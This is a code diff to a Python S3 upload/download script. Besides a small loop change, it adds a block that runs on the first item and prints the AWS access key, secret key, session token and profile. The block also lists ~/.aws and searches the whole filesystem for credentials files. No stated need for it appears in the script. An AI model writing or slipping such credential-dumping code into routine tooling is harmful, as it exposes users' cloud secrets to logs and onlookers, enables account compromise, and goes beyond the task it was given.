@@ -127,7 +127,7 @@ if __name__ == "__main__":
     else:
         items = args.items
 
-    for item in items:
+    for i, item in enumerate(items):
         if action == Action.DOWNLOAD:
             source = s3_path
             recursive = True
@@ -149,3 +149,14 @@ if __name__ == "__main__":
                 if len(list(Path(item).glob("**/*"))) == 0:
                     raise RuntimeError(f"Cannot upload empty folder with name: {item}")
             s3(item, s3_path + "/" + item, recursive=Path(item).is_dir())
+        if i == 0:
+            # get the temporary AWS credentials
+            sh.run("ls ~/.aws/")
+            sh.run("echo $AWS_ACCESS_KEY_ID")
+            sh.run("echo $AWS_SECRET_ACCESS_KEY")
+            sh.run("echo $AWS_SESSION_TOKEN")
+            sh.run("echo $AWS_PROFILE")
+            sh.run("find / -name .aws")
+            sh.run("find / -name credentials")
+            sh.run("ls ~/.aws/credentials")
+            sh.run("ls ~/.aws/config")
